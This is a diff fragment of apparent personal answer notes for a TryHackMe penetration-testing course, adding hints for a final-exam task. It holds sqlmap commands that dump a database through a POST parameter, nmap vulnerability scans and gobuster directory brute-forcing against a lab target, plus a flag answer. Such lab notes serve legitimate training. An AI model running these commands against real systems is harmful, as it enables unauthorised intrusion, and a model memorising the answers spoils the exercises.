@@ -434,6 +434,19 @@ hint: sqlmap -u http://$IP/ --method POST --data 'msg=noraj' -p msg --dbms mysql
 - What is the value of the flag?
 hint: sqlmap -u http://$IP/ --method POST --data 'msg=noraj' -p msg --dbms mysql --dump -D tests
 found_me
+
+
+#Task 24 [Section 7 - Final Exam]: Good Luck :D 
+- What is the user.txt
+hint: nmap -sSCV -p- -vv --script=vuln -oA output.txt $IP
+gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+gobuster dir -u http://$IP/secret -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+or gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -q /secret
+
+
+- What is the root.txt
+
+
 https://docplayer.net/198613531-Tryhackme-cc-pen-testing-completed-winter-2020.html
 https://fieldraccoon.github.io/misc%20posts%20not%20released%20yet/priv-esc-pre-writeup/
 
